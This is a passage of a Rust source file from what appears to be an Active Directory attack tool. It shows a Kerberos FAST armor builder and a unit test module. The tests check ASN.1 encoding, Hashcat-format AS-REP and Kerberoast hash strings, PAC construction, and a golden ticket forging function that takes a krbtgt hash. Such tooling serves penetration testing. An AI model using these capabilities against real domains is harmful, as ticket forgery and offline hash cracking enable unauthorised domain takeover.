    //     msg-type     [1] INTEGER (14),
    //     ap-options   [2] BIT STRING,
    //     ticket       [3] Ticket,
    //     authenticator [4] EncryptedData
    // }
    let pvno = asn1_context_tag(0, &asn1_integer(5));
    let msg_type = asn1_context_tag(1, &asn1_integer(14));
    let ap_options = asn1_context_tag(2, &asn1_bitstring_u32(0)); // no flags

    // Embed the TGT ticket
    let ticket = asn1_context_tag(3, params.tgt_ticket_der);

    // Build a minimal authenticator encrypted with the TGT session key.
    // Authenticator ::= SEQUENCE {
    //     authenticator-vno [0] INTEGER (5),
    //     crealm            [1] Realm,
    //     cname             [2] PrincipalName,
    //     cksum             [3] Checksum OPTIONAL,
    //     cusec             [4] INTEGER,
    //     ctime             [5] KerberosTime
    // }
    let auth_vno = asn1_context_tag(0, &asn1_integer(5));
    let auth_crealm = asn1_context_tag(1, &asn1_general_string(params.client_realm));

    // Principal name for armor: "WELLKNOWN/FAST"
    let name_type = asn1_context_tag(0, &asn1_integer(0)); // NT_UNKNOWN
    let name_string =
        asn1_context_tag(1, &asn1_sequence_of_general_strings(&["WELLKNOWN", "FAST"]));
    let cname = asn1_sequence(&[&name_type, &name_string]);
    let auth_cname = asn1_context_tag(2, &cname);

    let now = Utc::now();
    let cusec = asn1_context_tag(4, &asn1_integer(now.timestamp_subsec_nanos() as i64 / 1000));
    let ctime = asn1_context_tag(5, &asn1_generalized_time(&format_kerberos_time(&now)));

    let authenticator_plain =
        asn1_sequence(&[&auth_vno, &auth_crealm, &auth_cname, &cusec, &ctime]);

    // Encrypt authenticator with TGT session key (key usage 4 = AP-REQ in TGS)
    let cipher = new_kerberos_cipher(params.session_key_etype)
        .map_err(|e| OverthroneError::Crypto(format!("FAST: cipher init failed: {e}")))?;
    let encrypted_auth = cipher.encrypt(params.tgt_session_key, 4, &authenticator_plain);

    // EncryptedData ::= SEQUENCE {
    //     etype  [0] INTEGER,
    //     cipher [2] OCTET STRING
    // }
    let enc_etype = asn1_context_tag(0, &asn1_integer(params.session_key_etype as i64));
    let enc_cipher = asn1_context_tag(2, &encrypted_auth);
    let encrypted_data_der = asn1_sequence(&[&enc_etype, &enc_cipher]);
    let authenticator = asn1_context_tag(4, &encrypted_data_der);

    let ap_req = asn1_sequence(&[&pvno, &msg_type, &ap_options, &ticket, &authenticator]);

    // ── Step 2: Build KrbFastArmor ──────────────────────────────
    // KrbFastArmor ::= SEQUENCE {
    //     armor-type  [0] Int32 (1 = KRB_ARMOR_TGT),
    //     armor-value [1] OCTET STRING (AP-REQ DER)
    // }
    let armor_type = asn1_implicit_primitive(0, &asn1_integer(1));
    let armor_value = asn1_implicit_primitive(1, &ap_req);
    let fast_armor = asn1_sequence(&[&armor_type, &armor_value]);

    // ── Step 3: Build KrbFastEncPart ────────────────────────────
    // KrbFastEncPart ::= SEQUENCE {
    //     enc-body [0] OCTET STRING (KDC-REQ body DER),
    //     nonce    [1] UInt32
    // }
    let nonce: u32 = rand::random();
    let enc_body = asn1_implicit_primitive(0, params.inner_req_body_der);
    let nonce_der = asn1_implicit_primitive(1, &asn1_integer(nonce as i64));
    let fast_enc_part = asn1_sequence(&[&enc_body, &nonce_der]);

    // ── Step 4: Encrypt KrbFastEncPart with armor key ───────────
    // Per RFC 6806 §5.4.1: armor key = TGT session key directly.
    // Key usage 10 = PA-FX-FAST enc-part encryption.
    let encrypted_enc_part = cipher.encrypt(params.tgt_session_key, 10, &fast_enc_part);

    // EncryptedData wrapping
    let enc_part_etype = asn1_context_tag(0, &asn1_integer(params.session_key_etype as i64));
    let enc_part_cipher = asn1_context_tag(2, &encrypted_enc_part);
    let enc_part_encrypted_data = asn1_sequence(&[&enc_part_etype, &enc_part_cipher]);

    // ── Step 5: Build KrbFastRequest ────────────────────────────
    // KrbFastRequest ::= SEQUENCE {
    //     armor    [0] KrbFastArmor OPTIONAL,
    //     enc-part [2] EncryptedData
    // }
    let armor_field = asn1_implicit_constructed(0, &fast_armor);
    let enc_part_field = asn1_implicit_constructed(2, &enc_part_encrypted_data);
    let fast_request = asn1_sequence(&[&armor_field, &enc_part_field]);

    // ── Step 6: Wrap in PA-DATA (type = 136 = PA_FX_FAST) ─────
    // PA-DATA ::= SEQUENCE {
    //     padata-type  [1] INTEGER,
    //     padata-value [2] OCTET STRING
    // }
    let pa_type = asn1_implicit_primitive(1, &asn1_integer(136));
    let pa_value = asn1_implicit_primitive(2, &fast_request);
    let pa_data = asn1_sequence(&[&pa_type, &pa_value]);

    Ok(pa_data)
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::{TimeZone, Utc};

    // ─── normalize_username / normalize_realm ────────────────

    #[test]
    fn test_normalize_username_plain() {
        assert_eq!(normalize_username("administrator"), "administrator");
    }

    #[test]
    fn test_normalize_username_upn() {
        assert_eq!(normalize_username("admin@corp.local"), "admin");
    }

    #[test]
    fn test_normalize_username_downlevel() {
        assert_eq!(normalize_username("CORP\\administrator"), "administrator");
    }

    #[test]
    fn test_normalize_realm() {
        assert_eq!(normalize_realm("corp.local"), "CORP.LOCAL");
        assert_eq!(normalize_realm("CORP.LOCAL"), "CORP.LOCAL");
    }

    // ─── KRB-ERROR codes ────────────────────────────────────

    #[test]
    fn test_krb_error_to_string_known_codes() {
        assert_eq!(
            krb_error_to_string(6),
            "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found"
        );
        assert_eq!(
            krb_error_to_string(24),
            "KDC_ERR_PREAUTH_FAILED - Pre-auth failed (wrong password/hash)"
        );
        assert_eq!(
            krb_error_to_string(25),
            "KDC_ERR_PREAUTH_REQUIRED - Pre-auth required"
        );
        assert_eq!(
            krb_error_to_string(50),
            "KDC_ERR_BADOPTION - Bad option in request"
        );
        assert_eq!(
            krb_error_to_string(31),
            "KRB_AP_ERR_SKEW - Clock skew too great"
        );
    }

    #[test]
    fn test_krb_error_to_string_unknown() {
        assert_eq!(krb_error_to_string(0xff), "UNKNOWN_ERROR");
    }

    // ─── ASN.1 DER helpers ──────────────────────────────────

    #[test]
    fn test_asn1_length_short() {
        // Length < 128 → single byte
        assert_eq!(asn1_length(0), vec![0x00]);
        assert_eq!(asn1_length(1), vec![0x01]);
        assert_eq!(asn1_length(0x7f), vec![0x7f]);
    }

    #[test]
    fn test_asn1_length_long() {
        // Length ≥ 128 → multi-byte: high bit set + number of length bytes
        let result = asn1_length(0x80);
        assert_eq!(result.len(), 2);
        assert_eq!(result[0], 0x81);
        assert_eq!(result[1], 0x80);
    }

    #[test]
    fn test_asn1_length_255() {
        let result = asn1_length(255);
        // 255 < 256 → single length byte: high-bit + value
        assert_eq!(result[0], 0x81);
        assert_eq!(result[1], 0xff);
    }

    #[test]
    fn test_asn1_length_65535() {
        let result = asn1_length(65535);
        // 65535 >= 256 → two length bytes
        assert_eq!(result[0], 0x82);
        assert_eq!(result[1], 0xff);
        assert_eq!(result[2], 0xff);
    }

    #[test]
    fn test_asn1_integer_zero() {
        let der = asn1_integer(0);
        // Tag 0x02, length 1, value 0x00
        assert_eq!(der, vec![0x02, 0x01, 0x00]);
    }

    #[test]
    fn test_asn1_integer_positive() {
        let der = asn1_integer(42);
        assert_eq!(der, vec![0x02, 0x01, 0x2a]);
    }

    #[test]
    fn test_asn1_integer_127() {
        let der = asn1_integer(127);
        // Should NOT have a leading zero — 127 fits in one byte MSB=0
        assert_eq!(der, vec![0x02, 0x01, 0x7f]);
    }

    #[test]
    fn test_asn1_integer_128() {
        let der = asn1_integer(128);
        // 128 = 0x80 — needs leading zero to not be sign-extended
        assert_eq!(der, vec![0x02, 0x02, 0x00, 0x80]);
    }

    #[test]
    fn test_asn1_integer_negative() {
        let der = asn1_integer(-1);
        assert_eq!(der, vec![0x02, 0x01, 0xff]);
    }

    #[test]
    fn test_asn1_integer_256() {
        let der = asn1_integer(256);
        assert_eq!(der, vec![0x02, 0x02, 0x01, 0x00]);
    }

    #[test]
    fn test_asn1_octet_string() {
        let der = asn1_octet_string(b"hello");
        assert_eq!(der, vec![0x04, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);
    }

    #[test]
    fn test_asn1_octet_string_empty() {
        let der = asn1_octet_string(b"");
        assert_eq!(der, vec![0x04, 0x00]);
    }

    #[test]
    fn test_asn1_context_tag() {
        let der = asn1_context_tag(0, &[0x05, 0x00]);
        // Tag 0xa0, length 2
        assert_eq!(der, vec![0xa0, 0x02, 0x05, 0x00]);
    }

    #[test]
    fn test_asn1_context_tag_compound() {
        let der = asn1_context_tag(3, &[0x02, 0x01, 0x2a]);
        // Tag 0xa3, length 3
        assert_eq!(der, vec![0xa3, 0x03, 0x02, 0x01, 0x2a]);
    }

    #[test]
    fn test_asn1_application_tag() {
        let der = asn1_application_tag(0, &[0x02, 0x01, 0x05]);
        // Tag 0x60, length 3
        assert_eq!(der, vec![0x60, 0x03, 0x02, 0x01, 0x05]);
    }

    #[test]
    fn test_asn1_sequence_single() {
        let inner = asn1_integer(5);
        let seq = asn1_sequence(&[&inner]);
        // Tag 0x30, length passes through
        assert_eq!(seq[0], 0x30);
        assert_eq!(seq[1], inner.len() as u8);
    }

    #[test]
    fn test_asn1_sequence_multiple() {
        let a = asn1_integer(1);
        let b = asn1_integer(2);
        let seq = asn1_sequence(&[&a, &b]);
        assert_eq!(seq[0], 0x30);
    }

    #[test]
    fn test_asn1_bitstring_u32() {
        let bits = asn1_bitstring_u32(0x0001_0000);
        // Tag 0x03, content includes unused-bits byte + 4 bytes of payload
        assert_eq!(bits[0], 0x03);
        assert_eq!(bits[2], 0x00); // unused bits padding
    }

    #[test]
    fn test_asn1_general_string() {
        let s = asn1_general_string("test");
        // Tag 0x1b
        assert_eq!(s[0], 0x1b);
        assert_eq!(&s[2..], b"test");
    }

    #[test]
    fn test_asn1_generalized_time() {
        let der = asn1_generalized_time("20250101000000Z");
        assert_eq!(der[0], 0x18);
        assert_eq!(&der[2..], b"20250101000000Z");
    }

    #[test]
    fn test_asn1_sequence_of_general_strings() {
        let strings = &["KRBTGT", "CORP.LOCAL"];
        let seq = asn1_sequence_of_general_strings(strings);
        assert_eq!(seq[0], 0x30);
    }

    #[test]
    fn test_asn1_sequence_raw_bytes() {
        let inner = asn1_integer(42);
        let raw = asn1_sequence_raw_bytes(&inner);
        assert_eq!(raw[0], 0x30);
        assert_eq!(&raw[2..], &inner);
    }

    #[test]
    fn test_asn1_sequence_raw() {
        let a = asn1_integer(1);
        let b = asn1_integer(2);
        let raw = asn1_sequence_raw(&[&a, &b]);
        assert_eq!(raw[0], 0x30);
    }

    // ─── Hashcat format strings ──────────────────────────────

    #[test]
    fn test_hashcat_checksum_len_known() {
        assert_eq!(hashcat_checksum_len(23), 16); // RC4
        assert_eq!(hashcat_checksum_len(17), 12); // AES128
        assert_eq!(hashcat_checksum_len(18), 12); // AES256
    }

    #[test]
    fn test_hashcat_checksum_len_unknown() {
        // Non-RC4 etypes return 12 (AES default)
        assert_eq!(hashcat_checksum_len(0), 12);
    }

    #[test]
    fn test_format_asrep_hash_string_rc4() {
        let hash = format_asrep_hash_string(23, "admin", "CORP.LOCAL", &[0xAB; 16]);
        assert!(hash.starts_with("$krb5asrep$23$"));
        assert!(hash.contains("admin@CORP.LOCAL"));
    }

    #[test]
    fn test_format_tgs_hash_string_rc4() {
        let hash = format_tgs_hash_string(
            23,
            "admin",
            "CORP.LOCAL",
            "HTTP/server.corp.local",
            &[0xCD; 16],
        );
        // Format: $krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local$*cd...cd$
        assert!(hash.starts_with("$krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local"));
        // cipher is 16 bytes → checksum = 16 bytes (32 hex chars), edata2 empty
        // hash ends with the 32-char hex checksum and a trailing $
        let hex_checksum = "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd";
        assert!(hash.contains(hex_checksum));
        assert!(hash.ends_with("$"));
    }

    // ─── SID parsing ─────────────────────────────────────────

    #[test]
    fn test_validate_sid_format_valid() {
        assert!(validate_sid_format("S-1-5-21-1234-5678-9012-500").is_ok());
    }

    #[test]
    fn test_validate_sid_format_invalid_prefix() {
        assert!(validate_sid_format("J-1-5-21-1234").is_err());
    }

    #[test]
    fn test_validate_sid_format_too_short() {
        assert!(validate_sid_format("S-1-5").is_err());
    }

    #[test]
    fn test_parse_sid_to_bytes_known() {
        // S-1-5-21-3623811015-3361044348-30300820-500
        // Revision=1, IdentifierAuthority=5, 5 subauthorities: 21, 3623811015, 3361044348, 30300820, 500
        let sid_bytes = parse_sid_to_bytes("S-1-5-21-3623811015-3361044348-30300820-500");
        assert_eq!(sid_bytes[0], 1); // revision
        assert_eq!(sid_bytes[1], 5); // subAuthorityCount
        // IdentifierAuthority: 5 (NT Authority) → big-endian 0x00 0x00 0x00 0x00 0x00 0x05
        assert_eq!(&sid_bytes[2..8], &[0x00, 0x00, 0x00, 0x00, 0x00, 0x05]);
        // subAuthority[0] = 21 → 0x15 0x00 0x00 0x00 (little-endian)
        assert_eq!(sid_bytes[8], 0x15);
        assert_eq!(sid_bytes[9], 0x00);
    }

    #[test]
    fn test_parse_sid_to_bytes_rid_extraction() {
        // S-1-5-21-100-200-300-512 → 5 components, RID=512
        let sid_bytes = parse_sid_to_bytes("S-1-5-21-100-200-300-512");
        // Last 4 bytes (little-endian) = RID
        let rid_bytes = &sid_bytes[sid_bytes.len() - 4..];
        let rid = u32::from_le_bytes([rid_bytes[0], rid_bytes[1], rid_bytes[2], rid_bytes[3]]);
        assert_eq!(rid, 512);
    }

    // ─── Time conversion ─────────────────────────────────────

    #[test]
    fn test_chrono_to_filetime_unix_epoch() {
        // Unix epoch 1970-01-01 should not overflow and produce a known value
        let dt = Utc.with_ymd_and_hms(1970, 1, 1, 0, 0, 0).single().unwrap();
        let ft = chrono_to_filetime(&dt);
        // Known constant: 116_444_736_000_000_000 (offset between 1601-01-01 and 1970-01-01)
        assert_eq!(ft, 116_444_736_000_000_000u64);
    }

    #[test]
    fn test_chrono_to_filetime_modern() {
        // 2025-01-01 00:00:00 UTC
        let dt = Utc.with_ymd_and_hms(2025, 1, 1, 0, 0, 0).single().unwrap();
        let ft = chrono_to_filetime(&dt);
        // FILETIME = 100-ns intervals since 1601-01-01
        let expected_unix_100ns = 1735689600u64 * 10_000_000; // Unix timestamp * 10M
        let expected = expected_unix_100ns + 116_444_736_000_000_000;
        assert_eq!(ft, expected);
    }

    #[test]
    fn test_format_kerberos_time() {
        let dt = Utc
            .with_ymd_and_hms(2025, 6, 15, 14, 30, 0)
            .single()
            .unwrap();
        assert_eq!(format_kerberos_time(&dt), "20250615143000Z");
    }

    // ─── KDC flags ──────────────────────────────────────────

    #[test]
    fn test_kdc_flags_forwardable() {
        // KDC_OPT_FORWARDABLE = 0x40000000
        let flags = kdc_flags(0x40000000);
        // KerberosFlags.flags is a u32 in kerberos_asn1 v0.2
        assert_eq!(flags.flags, 0x40000000u32);
    }

    #[test]
    fn test_kdc_flags_default() {
        let flags = kdc_flags(0);
        assert_eq!(flags.flags, 0u32);
    }

    // ─── Session key generation ──────────────────────────────

    #[test]
    fn test_generate_session_key_rc4() {
        let key = generate_session_key(23);
        assert_eq!(key.len(), 16); // RC4 key = 16 bytes
    }

    #[test]
    fn test_generate_session_key_aes128() {
        let key = generate_session_key(17);
        assert_eq!(key.len(), 16); // AES128 key = 16 bytes
    }

    #[test]
    fn test_generate_session_key_aes256() {
        let key = generate_session_key(18);
        assert_eq!(key.len(), 32); // AES256 key = 32 bytes
    }

    // ─── PA-ENC-TIMESTAMP (real crypto, offline) ─────────────

    #[test]
    fn test_build_pa_enc_timestamp_produces_valid_padata() {
        let key = vec![0x00u8; 16];
        let pa_data = build_pa_enc_timestamp(&key, 23).unwrap();
        // PA-DATA type 2 (PA-ENC-TIMESTAMP)
        assert_eq!(pa_data.padata_type, 2);
        // EncryptedData DER encoding should be non-empty
        assert!(!pa_data.padata_value.is_empty());
        // EncryptedData SEQUENCE starts with tag 0x30
        assert_eq!(pa_data.padata_value[0], 0x30);
    }

    #[test]
    fn test_build_pa_enc_timestamp_aes256() {
        let key = vec![0xABu8; 32]; // AES256 key — 32 bytes
        let pa_data = build_pa_enc_timestamp(&key, 18).unwrap();
        assert_eq!(pa_data.padata_type, 2);
        assert!(!pa_data.padata_value.is_empty());
    }

    // ─── PAC construction ────────────────────────────────────

    #[test]
    fn test_build_minimal_pac_produces_valid_structure() {
        let pac = build_minimal_pac(
            "S-1-5-21-123456789-123456789-123456789",
            "Administrator",
            500,
            "CORP.LOCAL",
        );
        assert!(!pac.is_empty(), "PAC should not be empty");
        // PAC header starts with 4-byte ULONG cBuffers + 4-byte ULONG Version
        let count = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
        // Minimal PAC includes only LOGON_INFORMATION buffer (type 1)
        // Full forging builder adds CLIENT_INFO, SERVER_CKSUM, KDC_CKSUM separately
        assert_eq!(count, 1, "Minimal PAC has 1 buffer (LOGON_INFORMATION)");
        let version = u32::from_le_bytes([pac[4], pac[5], pac[6], pac[7]]);
        assert_eq!(version, 0, "PAC Version should be 0");
    }

    #[test]
    fn test_build_minimal_pac_contains_logon_info() {
        let pac = build_minimal_pac("S-1-5-21-100-200-300", "testuser", 1000, "TEST.LOCAL");
        let count = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
        assert_eq!(count, 1);
        // PAC_INFO_BUFFER: ulType(u32) + cbBufferSize(u32) + Offset(u64) = 16 bytes
        let buf_type = u32::from_le_bytes([pac[8], pac[9], pac[10], pac[11]]);
        assert_eq!(buf_type, 1, "First buffer should be LOGON_INFORMATION");
        // Buffer data starts after header (8) + 1 buffer entry (16) = offset 24
        let offset = u64::from_le_bytes([
            pac[16], pac[17], pac[18], pac[19], pac[20], pac[21], pac[22], pac[23],
        ]);
        assert_eq!(offset, 24, "LOGON_INFO data should start at offset 24");
    }

    // ─── NDR encoding ────────────────────────────────────────

    #[test]
    fn test_ndr_write_conformant_string() {
        let mut buf = Vec::new();
        let input = "test";
        // UTF-16LE encoding of "test"
        let utf16_units: Vec<u16> = input.encode_utf16().collect();
        let mut utf16_bytes: Vec<u8> = Vec::with_capacity(utf16_units.len() * 2);
        for unit in &utf16_units {
            utf16_bytes.extend_from_slice(&unit.to_le_bytes());
        }
        // Conformant string: max_count(4) + actual_count(4) + offset(4) + utf16_bytes + 2 null chars
        ndr_write_conformant_string(&mut buf, &utf16_bytes);
        assert!(!buf.is_empty(), "NDR string should not be empty");
        // First 4 bytes = max count (includes null terminator)
        let max_count = u32::from_le_bytes([buf[0], buf[1], buf[2], buf[3]]);
        // Count of UTF-16 code units (not null-terminated) = 4
        assert_eq!(max_count, input.len() as u32);
    }

    // ─── Golden ticket forge ─────────────────────────────────

    #[test]
    fn test_forge_tgt_produces_valid_kirbi() {
        let krbtgt_hash = [0x00u8; 16]; // Invalid dummy hash, but should not panic
        let result = forge_tgt(
            "CORP.LOCAL",
            "S-1-5-21-123456-123456-123456",
            "Administrator",
            500,
            &krbtgt_hash,
            23,
        );
        // Even with a dummy key, the function should construct valid DER
        assert!(
            result.is_ok(),
            "forge_tgt should not fail with valid params"
        );
    }

    // ─── Helper: hex_encode ──────────────────────────────────

    #[test]
    fn test_hex_encode_empty() {
        assert_eq!(hex_encode(b""), "");
    }

    #[test]
    fn test_hex_encode_simple() {
        assert_eq!(hex_encode(&[0xde, 0xad, 0xbe, 0xef]), "deadbeef");
    }

    #[test]
    fn test_hex_encode_uppercase() {
        // hex_encode produces lowercase
        assert_eq!(hex_encode(&[0xFF, 0x00]), "ff00");
    }
}
